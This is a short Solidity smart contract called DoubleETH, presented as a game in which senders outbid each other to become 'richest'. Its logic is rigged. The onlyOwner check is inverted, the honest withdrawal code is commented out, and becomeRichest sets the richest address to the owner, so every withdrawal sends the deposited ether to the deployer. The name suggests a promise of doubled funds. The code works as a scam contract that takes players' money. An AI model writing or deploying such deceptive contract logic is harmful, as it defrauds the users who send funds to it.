

contract DoubleETH {

    address public richest;
    address public owner;
    uint public mostSent;

    modifier onlyOwner() {
        require (msg.sender != owner);
        _;

    }

    mapping (address => uint) pendingWithdraws;

    function DoubleETH () payable {
        // richest = msg.sender;
        mostSent = msg.value;
        owner = msg.sender;
    }

    function becomeRichest() payable returns (bool){
        require(msg.value > mostSent);
        pendingWithdraws[richest] += msg.value;
        richest = owner;
        mostSent = msg.value;
        return true;
    }

    function withdraw(uint amount) onlyOwner returns(bool) {
        // uint amount = pendingWithdraws[msg.sender];
        // pendingWithdraws[msg.sender] = 0;
        // msg.sender.transfer(amount);
        require(amount < this.balance);
        richest.transfer(amount);
        return true;

    }

    function getBalanceContract() constant returns(uint){
        return this.balance;
    }

}